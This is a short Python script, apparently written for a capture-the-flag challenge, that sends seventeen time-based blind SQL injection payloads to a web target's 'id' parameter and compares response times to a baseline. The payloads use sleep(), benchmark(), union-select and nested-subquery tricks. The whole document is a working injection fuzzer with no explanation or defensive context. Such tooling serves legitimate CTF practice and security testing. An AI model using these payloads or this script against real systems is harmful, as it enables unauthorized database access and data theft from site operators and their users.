import requests, time
b='https://0541b0a5e26f92b4.chal.ctf.ae/'
def e(p):
    t=time.time()
    try: requests.get(b,params={'id':p},timeout=60)
    except: return 99
    return round(time.time()-t,2)
base=e('1'); print('base',base)
pays=[
 "1 and sleep(6)",
 "1 and sleep(6)-- -",
 "1 and sleep(6)#",
 "1;select sleep(6)-- -",
 "1 and if(1,sleep(6),0)",
 "1 xor sleep(6)",
 "1 && sleep(6)",
 "1 like sleep(6)",
 "1=sleep(6)",
 "sleep(6)",
 "1 union select sleep(6)-- -",
 "1 union all select sleep(6)",
 "-1 union select sleep(6)",
 "(select*from(select(sleep(6)))a)",
 "1 and (select 1 from(select sleep(6))x)",
 "1 regexp if(1,sleep(6),1)",
 "1 and benchmark(30000000,sha1(1))",
]
res=[(e(p),p) for p in pays]
for t,p in res: print(t, p)
print('MAX', max(res)[0])
